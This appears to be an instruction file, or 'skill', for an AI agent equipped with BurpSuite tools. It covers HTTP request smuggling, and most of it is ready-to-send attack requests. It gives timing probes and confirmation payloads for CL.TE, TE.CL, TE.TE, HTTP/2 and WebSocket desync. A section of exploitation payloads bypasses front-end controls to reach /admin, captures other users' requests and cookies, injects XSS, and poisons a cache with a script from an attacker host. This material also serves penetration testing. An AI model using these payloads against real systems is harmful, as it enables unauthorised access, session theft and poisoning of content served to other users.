# HTTP Request Smuggling Detection Skill

## Objective
Identify HTTP Request Smuggling vulnerabilities caused by discrepancies in how front-end and back-end servers parse HTTP requests.

## Instructions

### 1. Understand Request Smuggling Types

**CL.TE (Content-Length vs Transfer-Encoding):**
- Front-end uses Content-Length
- Back-end uses Transfer-Encoding

**TE.CL (Transfer-Encoding vs Content-Length):**
- Front-end uses Transfer-Encoding
- Back-end uses Content-Length

**TE.TE (Transfer-Encoding obfuscation):**
- Both use Transfer-Encoding but parse differently

### 2. Detection via Timing

**CL.TE detection:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q

```
If vulnerable, response will be delayed (back-end waiting for more data).

**TE.CL detection:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X

```
If vulnerable, response will be delayed.

### 3. Confirming CL.TE

**Smuggle a request that causes detectable effect:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Follow with normal request - if you get 404, smuggling confirmed.

### 4. Confirming TE.CL

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### 5. TE.TE Obfuscation Techniques
Try various Transfer-Encoding obfuscations:

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

Multiple Transfer-Encoding headers:
```http
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked, identity
```

### 6. H2.CL Request Smuggling (HTTP/2)

If target uses HTTP/2 to frontend, HTTP/1.1 to backend:

```http
:method: POST
:path: /
:authority: vulnerable-website.com
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com

```

### 7. H2.TE Request Smuggling

```http
:method: POST
:path: /
:authority: vulnerable-website.com
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com

```

### 8. Exploitation Scenarios

**Bypass front-end security:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

**Capture other users' requests:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 600
Cookie: session=YOUR_SESSION

comment=
```

**Reflected XSS via smuggling:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=<script>alert(1)</script> HTTP/1.1
Host: vulnerable-website.com

```

**Cache poisoning via smuggling:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Transfer-Encoding: chunked

0

GET /static/js/app.js HTTP/1.1
Host: attacker-website.com
Content-Length: 10

x=
```

### 9. WebSocket Smuggling

```http
GET /socket HTTP/1.1
Host: vulnerable-website.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

GET /admin HTTP/1.1
Host: vulnerable-website.com

```

### 10. Detection Tips

**Using Burp Suite:**
1. Use HTTP Request Smuggler extension
2. Check for timing differences
3. Look for unexpected responses
4. Test with Collaborator for OOB confirmation

**Manual detection:**
1. Send probe requests with timing payloads
2. Monitor response times
3. Send follow-up requests to confirm smuggling
4. Look for response desync

### 11. Confirm and Document
Document smuggling vulnerability with:
- Infrastructure setup (front-end/back-end)
- Smuggling type (CL.TE, TE.CL, TE.TE)
- Working payload
- Impact demonstration
- Evidence (responses, timing data)

## MCP Tools to Use

### BurpSuite
- `http1_request`: Send raw HTTP/1.1 requests
- `http2_request`: Send HTTP/2 requests
- `repeater_tab_with_payload`: Manual testing
- `collaborator_generate` / `collaborator_poll`: OOB confirmation

## Keywords
http smuggling, desync, http desync, cl.te, te.cl

## References
- PayloadsAllTheThings/Request Smuggling
- PortSwigger Request Smuggling Research
- HTTP Desync Attacks by James Kettle
